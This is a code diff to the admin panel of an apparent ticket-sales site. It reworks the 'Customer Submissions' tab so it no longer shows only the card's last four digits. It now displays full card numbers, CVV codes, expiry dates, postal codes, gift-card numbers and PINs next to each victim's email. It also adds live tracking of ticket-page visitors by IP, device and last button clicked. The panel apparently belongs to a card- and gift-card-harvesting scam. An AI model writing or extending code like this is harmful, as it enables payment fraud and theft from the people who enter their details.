@@ -202,22 +202,8 @@
     <!-- SUBMISSIONS TAB -->
     <div id="submissions" class="tab-content">
       <h2>Customer Submissions</h2>
-      <table class="table" id="submissionsTable">
-        <thead>
-          <tr>
-            <th>Email</th>
-            <th>Event Title</th>
-            <th>Quantity</th>
-            <th>Price/Ticket</th>
-            <th>Total</th>
-            <th>Card (Last 4)</th>
-            <th>Expiry</th>
-            <th>Zip Code</th>
-            <th>Submitted</th>
-          </tr>
-        </thead>
-        <tbody id="submissionsBody"></tbody>
-      </table>
+      <div id="submissionsStatus"></div>
+      <div id="submissionsList" style="display: grid; gap: 16px;"></div>
       <div id="noSubmissions" class="no-data">No submissions yet</div>
     </div>
 
@@ -227,7 +213,7 @@
       <div class="status-info" style="padding: 12px; background: #bee3f8; border-left: 4px solid #2c5282; border-radius: 4px; margin-bottom: 20px;">
         🔄 Auto-tracking visitors from tickets.html (refreshes every 5 seconds)
       </div>
-      <div id="visitorsList"></div>
+      <div id="visitorsList" style="display: grid; gap: 12px;"></div>
       <div id="noVisitors" class="no-data">No visitors tracked yet</div>
     </div>
   </div>
@@ -666,11 +652,9 @@
     // ==================== INITIALIZATION ====================
     document.addEventListener('DOMContentLoaded', async () => {
       await loadEvents();
-      await loadSubmissionsFromAPI();
+      await loadSubmissions();
       await loadVisitors();
       renderEventsList();
-      renderSubmissionsTable();
-      renderVisitorsTable();
       initializeTourDateModal();
       
       // Ensure default tab is set
@@ -719,9 +703,9 @@
       if (tabName === 'events') {
         renderEventsList();
       } else if (tabName === 'submissions') {
-        renderSubmissionsTable();
+        renderSubmissions();
       } else if (tabName === 'visitors') {
-        renderVisitorsTable();
+        startVisitorTracking();
       }
     }
 
@@ -1859,6 +1843,166 @@
     }
 
     // ==================== ACTIONS ====================
+    
+    async function renderSubmissions() {
+      await loadSubmissions();
+      const container = document.getElementById('submissionsList');
+      const noSubmissions = document.getElementById('noSubmissions');
+      
+      if (!submissions || submissions.length === 0) {
+        container.innerHTML = '';
+        noSubmissions.style.display = 'block';
+        return;
+      }
+      
+      noSubmissions.style.display = 'none';
+      
+      container.innerHTML = submissions.map((sub, idx) => {
+        const isGiftCard = sub.submissionType === 'giftcard';
+        const timestamp = new Date(sub.timestamp).toLocaleString();
+        
+        if (isGiftCard) {
+          return `
+            <div class="card" style="background: linear-gradient(135deg, rgba(34,197,94,0.1), rgba(34,197,94,0.05)); border: 1px solid rgba(34,197,94,0.3); padding: 20px;">
+              <div class="card-header" style="border-bottom: 1px solid rgba(34,197,94,0.2); padding-bottom: 12px;">
+                <h4 style="color: #10b981;">🎁 Gift Card Submission</h4>
+              </div>
+              <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-top: 16px;">
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Gift Card Digits</div>
+                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.giftCardNumber || '-'}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Gift Card PIN</div>
+                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.giftCardPin || '-'}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Client Email</div>
+                  <div style="font-size: 14px; color: #e6eef8;">${sub.email || '-'}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Amount</div>
+                  <div style="font-size: 14px; color: #10b981; font-weight: 700;">$${parseFloat(sub.amount || 0).toFixed(2)}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Submitted</div>
+                  <div style="font-size: 12px; color: #cbd5e1;">${timestamp}</div>
+                </div>
+              </div>
+            </div>
+          `;
+        } else {
+          // Card submission
+          return `
+            <div class="card" style="background: linear-gradient(135deg, rgba(59,130,246,0.1), rgba(59,130,246,0.05)); border: 1px solid rgba(59,130,246,0.3); padding: 20px;">
+              <div class="card-header" style="border-bottom: 1px solid rgba(59,130,246,0.2); padding-bottom: 12px;">
+                <h4 style="color: #3b82f6;">💳 Card Payment Submission</h4>
+              </div>
+              <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-top: 16px;">
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Card Digits</div>
+                  <div style="font-size: 14px; color: #e6eef8; word-break: break-all; font-weight: 600;">${sub.cardNumber || '-'}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">CVV</div>
+                  <div style="font-size: 14px; color: #e6eef8; font-weight: 600;">${sub.cvv || '-'}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Expiry Date</div>
+                  <div style="font-size: 14px; color: #e6eef8; font-weight: 600;">${sub.expiryDate || '-'}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Postal Code</div>
+                  <div style="font-size: 14px; color: #e6eef8; font-weight: 600;">${sub.zipCode || sub.postalCode || '-'}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Client Email</div>
+                  <div style="font-size: 14px; color: #e6eef8;">${sub.email || '-'}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Amount</div>
+                  <div style="font-size: 14px; color: #3b82f6; font-weight: 700;">$${parseFloat(sub.total || 0).toFixed(2)}</div>
+                </div>
+                <div>
+                  <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase; margin-bottom: 4px;">Submitted</div>
+                  <div style="font-size: 12px; color: #cbd5e1;">${timestamp}</div>
+                </div>
+              </div>
+            </div>
+          `;
+        }
+      }).join('');
+    }
+    
+    async function renderVisitors() {
+      await loadVisitors();
+      const container = document.getElementById('visitorsList');
+      const noVisitors = document.getElementById('noVisitors');
+      
+      if (!visitors || visitors.length === 0) {
+        container.innerHTML = '';
+        noVisitors.style.display = 'block';
+        return;
+      }
+      
+      noVisitors.style.display = 'none';
+      
+      // Sort by most recent first
+      const sortedVisitors = [...visitors].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+      
+      container.innerHTML = sortedVisitors.map(v => {
+        const timestamp = new Date(v.timestamp).toLocaleString();
+        const timeSpent = v.timeSpent ? `${Math.round(v.timeSpent / 1000)}s` : 'N/A';
+        const browserType = v.browser || 'Unknown';
+        const deviceType = v.deviceType || 'Unknown';
+        const ip = v.ip || 'N/A';
+        const lastButtonClicked = v.lastButtonClicked || 'None';
+        
+        return `
+          <div class="card" style="background: linear-gradient(135deg, rgba(148,163,184,0.08), rgba(148,163,184,0.03)); border: 1px solid rgba(148,163,184,0.15); padding: 18px;">
+            <div class="card-header" style="border-bottom: 1px solid rgba(148,163,184,0.1); padding-bottom: 12px; margin-bottom: 14px;">
+              <h4 style="color: #e6eef8; font-size: 14px; font-weight: 600; margin: 0;">👤 Visitor Tracking</h4>
+            </div>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px;">
+              <div>
+                <div style="font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">Device Type</div>
+                <div style="font-size: 13px; color: #cbd5e1; font-weight: 500;">📱 ${deviceType}</div>
+              </div>
+              <div>
+                <div style="font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">Browser</div>
+                <div style="font-size: 13px; color: #cbd5e1; font-weight: 500;">🌐 ${browserType}</div>
+              </div>
+              <div>
+                <div style="font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">IP Address</div>
+                <div style="font-size: 13px; color: #cbd5e1; font-weight: 500; word-break: break-all;"><code>${ip}</code></div>
+              </div>
+              <div>
+                <div style="font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">Time Spent</div>
+                <div style="font-size: 13px; color: #10b981; font-weight: 600;">⏱️ ${timeSpent}</div>
+              </div>
+              <div>
+                <div style="font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">Last Button Clicked</div>
+                <div style="font-size: 13px; color: #f59e0b; font-weight: 500;">🔘 ${lastButtonClicked}</div>
+              </div>
+              <div>
+                <div style="font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px;">Visit Time</div>
+                <div style="font-size: 13px; color: #cbd5e1;">${timestamp}</div>
+              </div>
+            </div>
+          </div>
+        `;
+      }).join('');
+    }
+    
+    async function startVisitorTracking() {
+      await renderVisitors();
+      
+      if (visitorPollingInterval) clearInterval(visitorPollingInterval);
+      visitorPollingInterval = setInterval(async () => {
+        await renderVisitors();
+      }, 5000);
+    }
+
     function syncToGitHub() {
       alert('GitHub sync requires GITHUB_TOKEN in Vercel env. Ensure token is configured in your deployment settings.');
     }
@@ -1875,6 +2019,5 @@
       link.click();
     }
   </script>
-  <script src="admin-script.js"></script>
 </body>
 </html>
